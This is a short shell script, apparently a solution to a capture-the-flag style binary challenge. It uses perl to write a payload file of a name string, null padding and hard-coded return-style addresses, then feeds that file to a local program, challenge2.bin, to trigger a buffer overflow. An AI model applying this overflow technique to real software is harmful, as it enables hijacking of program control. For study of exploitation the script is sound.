#write name to file
perl -e 'print "Rock Beom Kim";' > attack_spell2.txt

perl -e 'print "\0";' >> attack_spell2.txt

#write 89 characters of i to file
perl -e 'print "\x0"x88;' >> attack_spell2.txt

perl -e 'print "\x66";' >> attack_spell2.txt

perl -e 'print "\x0"x15;' >> attack_spell2.txt
#perl -e 'print "\x00\xf3\xff\xbf";' >> attack_spell1.txt

perl -e 'print "\xe6\x84\x04\x08";' >> attack_spell2.txt

perl -e 'print "\x60\xa0\x04\x08";' >> attack_spell2.txt

./challenge2.bin < attack_spell2.txt
